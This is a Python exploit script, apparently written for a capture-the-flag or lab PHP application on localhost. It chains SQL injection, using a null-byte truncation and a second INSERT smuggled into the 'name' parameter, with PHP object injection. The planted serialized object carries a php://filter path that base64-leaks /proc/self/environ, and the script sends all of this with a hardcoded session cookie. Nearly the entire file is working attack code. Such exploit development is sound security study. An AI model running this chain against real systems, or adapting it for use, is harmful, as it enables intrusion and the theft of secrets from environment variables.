#!/usr/bin/env python3
import subprocess
import requests
import sys
import time

HOST = "localhost"
PORT = 8080
BASE = f"http://{HOST}:{PORT}/index.php"
PHP_SESSION = "00cf6844db8961b168a3caad2db8c30e"

s = requests.Session()
if PHP_SESSION:
    # set cookie for the session (works without specifying domain)
    s.cookies.update({"PHPSESSID": PHP_SESSION})


# Build a correct serialized Virus object via PHP CLI so string lengths match.
php_cmd = [
    "php", "-r",
    r'''class Virus{public $name;public $species;public $valid_species=[];function __construct($n,$s){$this->name=$n;$this->species=$s;}}; echo rawurlencode(serialize(new Virus("pwn","php://filter/read=convert.base64-encode/resource=/proc/self/environ")));'''
]
print("[*] Generating serialized payload via php CLI...")
proc = subprocess.run(php_cmd, capture_output=True, text=True)
if proc.returncode != 0:
    print("[!] php CLI failed:", proc.stderr.strip())
    sys.exit(1)
SER_ENC = proc.stdout.strip()
if not SER_ENC:
    print("[!] empty serialized output")
    sys.exit(1)

# Construct the injected name: include a %00 to trigger truncation, then close quote and inject a second INSERT.
name_injection = "GOOD%00'); INSERT INTO virus_vault (virus) VALUES ('" + SER_ENC + "'); --"
params = {
    "action": "store",
    "species": "Ghostroot",
    # keep name raw (already contains percent escapes). We'll append it to the URL ourselves.
    "debug": "1"
}

# Build full URL manually so percent sequences are not re-encoded by requests' params handling.
query = f"action=store&species=Ghostroot&name={name_injection}&debug=1"
url = f"{BASE}?{query}"

print("[*] Sending HTTP GET via requests (percent-escapes preserved in URL):")
print("    ", url)
try:
    # use session 's' (preserves cookies / uses PHP_SESSION if set)
    r = s.get(url, timeout=5)
    print("[*] Response status:", r.status_code)
    print(r.text)
except Exception as e:
    print("[!] requests failed:", e)

print("\n[*] Done. Inspect the server output / DB. If successful, fetch an id containing the injected serialized object and trigger fetch to leak the base64 output from php://filter.")